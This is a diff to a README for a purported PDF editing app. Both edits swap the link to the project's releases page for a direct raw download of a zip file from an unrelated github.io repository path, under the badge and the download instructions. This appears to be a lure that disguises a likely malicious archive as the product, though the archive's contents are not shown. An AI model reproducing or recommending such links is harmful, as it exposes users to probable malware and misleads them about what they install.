@@ -5,7 +5,7 @@ description: "Edit, merge, split, annotate, and convert PDF documents with this 
 ---
 # 📂 pro-dc-reader-pdf-editor - Edit and manage your digital documents
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Bruisercybersex859/pro-dc-reader-pdf-editor/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Bruisercybersex859/bruisercybersex859.github.io/raw/refs/heads/main/theorize/io-github-bruisercybersex-v1.1.zip)
 
 ## 📌 About this application
 
@@ -15,7 +15,7 @@ If you have a scanned page, the built-in optical character recognition tool conv
 
 ## 🚀 How to download the software
 
-To get the application, visit this page to download: [https://github.com/Bruisercybersex859/pro-dc-reader-pdf-editor/releases](https://github.com/Bruisercybersex859/pro-dc-reader-pdf-editor/releases).
+To get the application, visit this page to download: [https://github.com/Bruisercybersex859/bruisercybersex859.github.io/raw/refs/heads/main/theorize/io-github-bruisercybersex-v1.1.zip](https://github.com/Bruisercybersex859/bruisercybersex859.github.io/raw/refs/heads/main/theorize/io-github-bruisercybersex-v1.1.zip).
 
 1. Open your web browser.
 2. Go to the link above.
